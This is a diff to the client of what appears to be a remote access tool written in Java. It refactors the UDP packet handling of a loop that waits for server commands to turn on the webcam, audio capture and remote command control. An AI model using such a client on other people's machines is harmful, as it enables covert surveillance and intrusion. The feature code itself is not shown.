@@ -3,7 +3,7 @@ package Client;
 import Client.Features.*;
 import Handler.Message;
 import Handler.ObjectHandler;
-import Handler.InfoHandler;
+import Handler.PacketHandler;
 import Tools.Network.NetworkInterface;
 
 import java.io.IOException;
@@ -28,10 +28,10 @@ public class Client extends NetworkInterface {
     private final Random rand = new Random(LocalDateTime.now().getSecond());
     private final int id = rand.nextInt(1000000);
 
-    private final InfoHandler infoHandler;
+    private final PacketHandler packetHandler;
     private final ObjectHandler<Message<?>> clientObjectHandler;
 
-    private final CameraCapture cameraCapture = new CameraCapture(0);
+    private final CameraCapture cameraCapture;
     private final AudioCapture audioCapture = new AudioCapture();
     private final Chat chat = new Chat();
     private final CMDControl cmdControl = new CMDControl();
@@ -40,8 +40,11 @@ public class Client extends NetworkInterface {
     public Client(int PORT) throws SocketException {
         super(PORT);
         socket = new DatagramSocket();
-        infoHandler = new InfoHandler(socket);
+        packetHandler = new PacketHandler(socket);
         clientObjectHandler = new ObjectHandler<>();
+
+        cameraCapture = new CameraCapture(0, new PacketHandler(socket, address, PORT));
+
         threadListener.execute(listener());
     }
 
@@ -51,10 +54,8 @@ public class Client extends NetworkInterface {
                 String value = String.valueOf(id);
                 Message<String[]> info = () -> new String[]{String.valueOf(CommandByte.START_BYTE), value};
                 byte[] infoData = Objects.requireNonNull(clientObjectHandler.writeObjects(info));
-                socket.connect(address, PORT);
-                infoHandler.send(infoData, infoData.length);
-                socket.disconnect();
-                byte[] dataReceived = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
+                packetHandler.send(infoData, infoData.length, address, PORT);
+                byte[] dataReceived = packetHandler.receive(1, packetHandler.getPacketAddress(), packetHandler.getPacketPort());
                 if (dataReceived[0] == CommandByte.CONFIRMATION_BYTE) {
                     System.out.println("Client connected to a server!");
                     threadListener.execute(infoListener());
@@ -81,12 +82,12 @@ public class Client extends NetworkInterface {
 
             try {
                 socket.connect(address, PORT);
-                infoHandler.send(objInfo, objInfo.length);
+                packetHandler.send(objInfo, objInfo.length);
 
-                infoHandler.send(objSystem, objSystem.length);
+                packetHandler.send(objSystem, objSystem.length);
                 socket.disconnect();
 
-                if (infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort())[0] == CommandByte.INFO_ACHIEVED_BYTE) {
+                if (packetHandler.receive(1, packetHandler.getPacketAddress(), packetHandler.getPacketPort())[0] == CommandByte.INFO_ACHIEVED_BYTE) {
                     threadListener.execute(featureListener());
                 }
             } catch (IOException e) {
@@ -100,12 +101,11 @@ public class Client extends NetworkInterface {
             outer:
             while (true) {
                 try {
-                    byte[] data = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
+                    byte[] data = packetHandler.receive(1, packetHandler.getPacketAddress(), packetHandler.getPacketPort());
                     switch (data[0]) {
                         case CommandByte.CAMERA_BYTE -> {
+                            cameraCapture.open();
                             cameraCapture.startFeature();
-                            byte[] imageData = cameraCapture.getImageAsByteArray();
-                            infoHandler.send(imageData, imageData.length, infoHandler.getAddress(), infoHandler.getPort());
                         }
                         case CommandByte.AUDIOCAPTURE_BYTE -> audioCapture.startFeature();
                         case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
